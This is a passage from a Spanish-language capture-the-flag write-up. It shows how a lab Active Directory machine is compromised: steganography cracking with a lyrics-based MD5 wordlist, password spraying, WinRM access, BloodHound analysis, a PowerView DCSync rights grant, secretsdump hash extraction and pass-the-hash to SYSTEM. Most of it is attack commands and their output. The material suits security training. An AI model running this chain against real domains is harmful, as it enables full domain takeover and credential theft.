Vamos a copiar todos esos archivos de texto, saquemos las oraciones y luego transformémoslas en **hashes MD5**.

#### Creando Wordlist con las Letras de Canciones Encontradas Convirtiendo las Oraciones en Hashes MD5 {#wordlists}

Primero, descarguemos los archivos de texto:
```bash
mkdir canciones
cd canciones
.
wget -r -l1 -nd -A txt http://192.168.212.4/songs
--2025-04-17 19:39:49--  http://192.168.212.4/songs
Conectando con 192.168.212.4:80... conectado.
Petición HTTP enviada, esperando respuesta... 301 Moved Permanently
Localización: http://192.168.212.4/songs/ [siguiendo]
--2025-04-17 19:39:49--  http://192.168.212.4/songs/
Reutilizando la conexión con 192.168.212.4:80.
Petición HTTP enviada, esperando respuesta... 200 OK
...
...
...
2025-04-17 19:39:49 (285 MB/s) - «Skyisthelimit.txt.1.tmp» guardado [1793/1793]

Eliminando Skyisthelimit.txt.1.tmp puesto que debería ser rechazado.

ACABADO --2025-04-17 19:39:49--
Tiempo total de reloj: 0.05s
Descargados: 6 ficheros, 14K en 0s (384 MB/s)
```

Una vez que los tenemos descargados, vamos a sacar las oraciones y a transformarlas en **hashes MD5** con el siguiente oneliner:
```bash
cat *.txt | grep -v '^$' | while read linea; do echo -n "$linea" | md5sum | awk '{print $1}'; done > hashes.txt
```
Tenemos listo el wordlist.

Pero, vamos a agregar un par de **hashes MD5** extra, siendo los que están en la página web que vimos en el código fuente.

Lo puedes crear de esta manera:
```bash
❯ echo -n "I keep it music music, I eat that lunch (Yeah)" | md5sum | awk '{print $1}'
644d61b2e502099c1c786dc5d87c6689
.
echo -n "It was all a dream" | md5sum | awk '{print $1}'
99ae77c0c0faf78b872f9f452e3eaa241
```
Ya solo agrégalos al final o donde quieras del wordlist.

#### Crackeando Imágenes con stegcracker {#stegcracker}

Primero, vamos a instalar la herramienta **stegcracker**:
```bash
apt install stegcracker
```
Al usar la herramienta **stegcracker**, indica que podemos instalar una herramienta más nueva, siendo **stegseek**, que usaremos más adelante.

Ahora, usemos **stegcracker** para intentar crackear las imágenes y ver si alguna tiene un archivo oculto.

Resulta que la imagen **big2.jpg** tiene un archivo oculto:
```bash
stegcracker big2.jpg canciones/hashes.txt
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2025 - Luke Paris (Paradoxis)
.
Counting lines in wordlist..
Attacking file 'big2.jpg' with wordlist 'canciones/hashes.txt'..
Successfully cracked file with password: 99ae77c0c0faf78b872f9f452e3eaa24
Tried 437 passwords
Your file has been written to: big2.jpg.out
99ae77c0c0faf78b872f9f452e3eaa24
```
Excelente, se pudo crackear y obtuvimos un archivo llamado **big2.jpg.out**. Además, nos muestra el **hash MD5** que sirvió para crackear la imagen, siendo que es de la misma frase **"It was all a dream"** que sacamos del código fuente de la página web.

Vamos a leer ese archivo:
```bash
cat big2.jpg.out
...
```
Parece ser una contraseña. La comprobaremos más adelante.

#### Crackeando Imágenes con stegseek {#stageseek}

Vamos a instalar la herramienta **stegseek**:
```bash
apt install stegseek
```
Ya sabemos qué imagen debemos usar, siendo la imagen **big2.jpg**.

Bien, tenemos que indicarle que vamos a crackear (**--crack**) una imagen, la ubicación de la imagen, el wordlist a usar y donde se guardara el resultado:
```bash
stegseek --crack big2.jpg canciones/hashes.txt resultado.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "99ae77c0c0faf78b872f9f452e3eaa24"
[i] Original filename: "frase.txt".
[i] Extracting to "resultado.txt".
```
Muy bien, obtuvimos el **hash MD5** que funcionó, el archivo original que estaba oculto y se guarda su contenido en el archivo que escogimos.

Veamos ese archivo:
```bash
cat resultado.txt
...
```
La misma contraseña.

### Obteniendo Archivo Original con steghide y Aplicando Password Spraying con Nueva Contraseña {#ComprobandoPass}

Probemos que pasa si usamos **steghide** y el **hash MD5** que resulto ser el correcto:
```bash
steghide extract -sf big2.jpg
Anotar salvoconducto: 
anot� los datos extra�dos e/"frase.txt".
```
Obtuvimos el archivo oculto original.

Y si lo intentamos ver, podremos ver la misma contraseña:
```bash
cat frase.txt
...
```
Vamos a aplicar **Password Spraying** a la lista de usuarios que ya tenemos, para ver si esta contraseña pertenece a alguien.

Lo haremos con **crackmapexec**:
```bash
crackmapexec smb 192.168.212.4 -u usuarios.txt -p '******' --no-brute --continue-on-success
SMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False)
SMB         192.168.212.4   445    BIG              [-] bbr.thl\big:****** STATUS_LOGON_FAILURE 
SMB         192.168.212.4   445    BIG              [-] bbr.thl\song:****** STATUS_LOGON_FAILURE 
SMB         192.168.212.4   445    BIG              [+] bbr.thl\music:****** 
SMB         192.168.212.4   445    BIG              [-] bbr.thl\administrator:****** STATUS_LOGON_FAILURE
```
Parece que es la contraseña para el **usuario music**.

Comprobémoslo:
```bash
crackmapexec smb 192.168.212.4 -u 'music' -p '******'
SMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False)
SMB         192.168.212.4   445    BIG              [+] bbr.thl\music:******
```

Probemos si funciona contra el **servicio WinRM**:
```bash
crackmapexec winrm 192.168.212.4 -u 'music' -p '******'
SMB         192.168.212.4   5985   BIG              [*] Windows 10 / Server 2016 Build 14393 (name:BIG) (domain:bbr.thl)
HTTP        192.168.212.4   5985   BIG              [*] http://192.168.212.4:5985/wsman
WINRM       192.168.212.4   5985   BIG              [+] bbr.thl\music:****** (Pwn3d!)
```
Sí sirve.

Vamos a autenticarnos con este usuario:
```batch
evil-winrm -i 192.168.212.4 -u 'music' -p '******'
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
.                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\TEMP\Documents> whoami
bbr\music
```
Estamos dentro.

Y curiosamente, este usuario sí tiene la flag:
```batch
*Evil-WinRM* PS C:\Users\TEMP\Documents> cd C:\Users\Music\Documents
*Evil-WinRM* PS C:\Users\Music\Documents> dir

    Directory: C:\Users\Music\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/30/2024  12:53 AM             32 user.txt

*Evil-WinRM* PS C:\Users\Music\Documents> type user.txt
...
```
Con esto hecho, ya tenemos la contraseña de 2 usuarios.

## Post Explotación {#Post}

### Enumeración de AD con BloodHound y SharpHound {#BloodHound}

Analizando ambos usuarios, parece que el **usuario song** tiene más privilegios que el **usuario music**.

Observa los privilegios del **usuario song**:
```batch
*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

Compáralo con el **usuario music**:
```batch
*Evil-WinRM* PS C:\Users\Music\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Y parece que los grupos a los que pertenece el **usuario song** tienen más privilegios:
```batch
*Evil-WinRM* PS C:\Users\TEMP.bbr\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
bbr\Privilege users                        Group            S-1-5-21-1487034055-435569681-4283575489-1107 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```
Me llama mucho la atención que este usuario este en el grupo **Account Operators**.

| **Grupo Account Operators** |
|:-----------:|
| *Es un grupo predefinido que tiene permisos específicos relacionados con la gestión de cuentas de usuario y grupo dentro de un dominio. Este grupo se usa principalmente para delegar tareas administrativas limitadas sin otorgar privilegios de administrador completo.* |

Quizá nos ayude estar dentro de este grupo más adelante.

Para esta máquina, utilizaremos **BloodHound Community Edition y SharpHound v1.1.1**.

Este blog enseña como instalar **BloodHound Community Edition** y como usarlo:
* <a href="https://m4lwhere.medium.com/the-ultimate-guide-for-bloodhound-community-edition-bhce-80b574595acf" target="_blank">The Ultimate Guide for BloodHound Community Edition (BHCE)</a>

Y de aquí puedes conseguir **SharpHound v1.1.1**:
* <a href="https://github.com/SpecterOps/SharpHound/releases/tag/v1.1.1" target="_blank">Repositorio de SpecterOps: SharpHound v1.1.1</a>

Carguemos **SharpHound** a la sesión de **evil-winrm** del **usuario song** y trabajemos con este usuario de ahora en adelante:
```batch
*Evil-WinRM* PS C:\Users\Music\Desktop> upload SharpHoundV1.exe
Info: Uploading /../TheHackersLabs/Big/content/sharphoundV1.1.1/SharpHoundV1.exe to C:\Users\Music\Desktop\SharpHoundV1.exe
Data: 1402880 bytes of 1402880 bytes copied
Info: Upload successful!
```

Bien, ahora usémoslo y descarguemos el **archivo ZIP** resultante:
```batch
*Evil-WinRM* PS C:\Users\Music\Desktop> .\SharpHoundV1.exe -c All
2025-04-17T21:49:39.2957598-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
...
...
Closing writers
2025-04-17T21:50:28.4673290-07:00|INFORMATION|Status: 96 objects finished (+96 2)/s -- Using 42 MB RAM
2025-04-17T21:50:28.4673290-07:00|INFORMATION|Enumeration finished in 00:00:48.7349869
2025-04-17T21:50:28.5299496-07:00|INFORMATION|Saving cache with stats: 56 ID to type mappings.
 56 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2025-04-17T21:50:28.5299496-07:00|INFORMATION|SharpHound Enumeration Completed at 9:50 PM on 4/17/2025! Happy Graphing!
.
*Evil-WinRM* PS C:\Users\Music\Desktop> download 20250417215027_BloodHound.zip
Info: Downloading C:\Users\Music\Desktop\20250417215027_BloodHound.zip to 20250417215027_BloodHound.zip                                       
Info: Download successful!
```

Ya podemos cargar este archivo al **BloodHound** y lo primero que haremos será buscar al **usuario song** (no olvides marcarlo como **owned**):

<p align="center">
<img src="/assets/images/THL-writeup-big/Captura9.png">
</p>

Podemos ver más claramente a los grupos que pertenece, y ahí vemos al grupo **Account Operators**.

Además, observa que buscando las cuentas que sean vulnerables al **AS-REP Roasting Attack**, sale nuestro usuario:

<p align="center">
<img src="/assets/images/THL-writeup-big/Captura10.png">
</p>

Analizando un poco más, observa lo que podemos ver en las rutas cortas a los sistemas de confianza para la delegación sin restricciones:

<p align="center">
<img src="/assets/images/THL-writeup-big/Captura11.png">
</p>

Parece que tenemos el **permiso GenericAll** para el **grupo Special Permissions**. Y aunque busque información sobre este grupo, parece que es un grupo personalizado para asignar permisos especiales a los usuarios.

Viendo las **"rutas cortas para los administradores de dominio"**, vemos que el **grupo Special Permissions**, tiene el **permiso de modificar el DACL** del **contenedor USERS**, que a su vez se relaciona con el dominio completo:

<p align="center">
<img src="/assets/images/THL-writeup-big/Captura12.png">
</p>

Esto ya nos da una idea de que puede ser vulnerable.

Para terminar, si vemos las **"rutas cortas de los objetos propios"**, encontramos que el **grupo Special Permissions** tiene el **permiso de modificar el DACL** del dominio, lo que nos permitiría aplicar el **DCSync Attack**:

<p align="center">
<img src="/assets/images/THL-writeup-big/Captura13.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-big/Captura14.png">
</p>

### Aplicando DCSync Attack con PowerView {#DCSyncAttack}

Veamos rápidamente de que va este ataque:

| **DCSync Attack** |
|:-----------:|
| *El ataque DCSync es una técnica utilizada por atacantes dentro de un dominio de Active Directory (AD) para extraer credenciales (incluyendo hashes de contraseñas de usuarios, administradores e incluso del krbtgt) directamente desde el controlador de dominio (Domain Controller), sin necesidad de acceso físico al mismo. El ataque DCSync simula el comportamiento de un controlador de dominio (DC) legítimo solicitando replicación de objetos del directorio. En otras palabras, el atacante finge ser otro controlador de dominio y solicita los datos del AD, como si estuviera sincronizándose con el resto del dominio.* |

Para este ataque, necesitamos la herramienta **PowerView** que puedes descargar aquí:
* <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank">Repositorio de PowerShellMafia: PowerView.ps1</a>

Una vez que lo descargues, súbelo a la sesión de **evil-winrm**:
```batch
*Evil-WinRM* PS C:\Users\song\Desktop> upload PowerView.ps1
Info: Uploading /../TheHackersLabs/Big/content/post/PowerView.ps1 to C:\Users\song\Desktop\PowerView.ps1
Data: 1027036 bytes of 1027036 bytes copied
Info: Upload successful!
```

Carga el **PowerView** como módulo a la sesión:
```batch
*Evil-WinRM* PS C:\Users\song\Desktop> Import-Module .\PowerView.ps1
```
Ahora bien, en la descripción del **permiso WriteDacl**, ya nos dan los pasos que debemos seguir.

Para empezar, debemos ser miembros del **grupo Special Permissions**, siendo que podemos agregarnos de estas dos maneras:
```batch
net group "Special Permissions" song /add /domain
.
Add-ADGroupMember -Identity "Special Permissions" -Members "song"
```

Si salimos de la sesión y volvemos a entrar, ya nos debería aparecer que estamos dentro de ese grupo:
```batch
*Evil-WinRM* PS C:\Users\song\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
bbr\Special Permissions                    Group            S-1-5-21-1487034055-435569681-4283575489-1108 Mandatory group, Enabled by default, Enabled group
bbr\Privilege users                        Group            S-1-5-21-1487034055-435569681-4283575489-1107 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

Ahora, seguimos los pasos que nos indican:
* Convertir la contraseña de nuestro usuario en un objeto **SecureString** para convertirla en una contraseña "segura".
* Crear el **objeto PSCredential**, agregándole el dominio, nuestro usuario y la contraseña segura.
* Modificar los **permisos del ACL** con el **comando Add-DomainObjectAcl** del **módulo PowerView.ps1**, para darle los mismos privilegios que tiene el dominio a nuestro **usuario song** y pueda replicar **objetos del AD** (**incluyendo los hashes**).

Apliquémoslo:
```batch
*Evil-WinRM* PS C:\Users\song\Desktop> $SecPassword = ConvertTo-SecureString 'contraseña_de_usuario_song' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\song\Desktop> $Cred = New-Object System.Management.Automation.PSCredential('bbr.thl\song', $SecPassword)
*Evil-WinRM* PS C:\Users\song\Desktop> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=bbr,DC=thl" -PrincipalIdentity song -Rights DCSync
```
Solamente modificamos el último paso, ya que se debe especificar el dominio para que funcione bien.

Con todo esto listo, ya deberíamos poder dumpear los hashes de la máquina víctima:
```bash
impacket-secretsdump bbr.thl/song@192.168.212.4
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5d48bcf84aea999fb1ade06970a81237:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a0b3723455bd8be604ae2e1df74db81b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
bbr.thl\Music:1103:aad3b435b51404eeaad3b435b51404ee:8ab1d3828490421d0dc1ddd6e2552d90:::
bbr.thl\song:1104:aad3b435b51404eeaad3b435b51404ee:5919764374e465e68f886ac0c4f75ab3:::
BIG$:1000:aad3b435b51404eeaad3b435b51404ee:0f7d9f62a1d1fdfb48aecc7f2663824e:::
...
...
```
Excelente, tenemos los hashes.

Podemos comprobar si funcionan los del **usuario administrator** con **crackmapexec**:
```bash
crackmapexec smb 192.168.212.4 -u "administrator" -H "5d48bcf84aea999fb1ade06970a81237"
SMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False)
SMB         192.168.212.4   445    BIG              [+] bbr.thl\administrator:5d48bcf84aea999fb1ade06970a81237 (Pwn3d!)

crackmapexec smb 192.168.212.4 -u "administrator" -H "aad3b435b51404eeaad3b435b51404ee:5d48bcf84aea999fb1ade06970a81237"
SMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False)
SMB         192.168.212.4   445    BIG              [+] bbr.thl\administrator:5d48bcf84aea999fb1ade06970a81237 (Pwn3d!)
```
Tanto el **hash NTML**, como el **hash NT** funcionan para **SMB**.

Pero solamente el **hash NT** funciona para el **servicio WinRM**:
```bash
crackmapexec winrm 192.168.212.4 -u "administrator" -H "5d48bcf84aea999fb1ade06970a81237"
SMB         192.168.212.4   5985   BIG              [*] Windows 10 / Server 2016 Build 14393 (name:BIG) (domain:bbr.thl)
HTTP        192.168.212.4   5985   BIG              [*] http://192.168.212.4:5985/wsman
WINRM       192.168.212.4   5985   BIG              [+] bbr.thl\administrator:5d48bcf84aea999fb1ade06970a81237 (Pwn3d!)
```

Con el **hash NTLM** del administrador, podemos indicarle a **crackmapexec** que realice una copia de la **base de datos NTDS.dit** (que almacena las cuentas de usuario y sus hashes de contraseñas en **Active Directory**) utilizando la técnica de **Volume Shadow Copy Service (VSS)**:
```bash
crackmapexec smb 192.168.212.4 -u "administrator" -H "aad3b435b51404eeaad3b435b51404ee:5d48bcf84aea999fb1ade06970a81237" --ntds vss
SMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False)
SMB         192.168.212.4   445    BIG              [+] bbr.thl\administrator:5d48bcf84aea999fb1ade06970a81237 (Pwn3d!)
SMB         192.168.212.4   445    BIG              [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.212.4   445    BIG              Administrator:500:aad3b435b51404eeaad3b435b51404ee:5d48bcf84aea999fb1ade06970a81237:::
SMB         192.168.212.4   445    BIG              Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.212.4   445    BIG              DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.212.4   445    BIG              BIG$:1000:aad3b435b51404eeaad3b435b51404ee:0f7d9f62a1d1fdfb48aecc7f2663824e:::
SMB         192.168.212.4   445    BIG              krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a0b3723455bd8be604ae2e1df74db81b:::
SMB         192.168.212.4   445    BIG              bbr.thl\Music:1103:aad3b435b51404eeaad3b435b51404ee:8ab1d3828490421d0dc1ddd6e2552d90:::
SMB         192.168.212.4   445    BIG              bbr.thl\song:1104:aad3b435b51404eeaad3b435b51404ee:5919764374e465e68f886ac0c4f75ab3:::
SMB         192.168.212.4   445    BIG              [+] Dumped 7 NTDS hashes to /root/.cme/logs/BIG_192.168.212.4_2025-04-18_134853.ntds of which 6 were added to the database
```
Listo, ya solo queda autenticarnos como el administrador aplicando el **movimiento lateral Pass-The-Hash**.

Vamos a hacerlo con **impacket-psexec**:
```batch
impacket-psexec "bbr.thl/administrator"@192.168.212.4 -hashes aad3b435b51404eeaad3b435b51404ee:5d48bcf84aea999fb1ade06970a81237
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.212.4.....
[*] Found writable share ADMIN$
[*] Uploading file NwJJoLhv.exe
[*] Opening SVCManager on 192.168.212.4.....
[*] Creating service depx on 192.168.212.4.....
[*] Starting service depx.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Y por último con **evil-winrm**:
```batch
evil-winrm -i 192.168.212.4 -u 'administrator' -H '5d48bcf84aea999fb1ade06970a81237'
Evil-WinRM shell v3.7
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
.                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
bbr\administrator
```

Solamente buscamos la última flag que nos falta:
```batch
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir

    Directory: C:\Users\Administrator\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/30/2024   5:05 AM             32 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Documents> type root.txt
...
```
Y con esto terminamos la máquina.
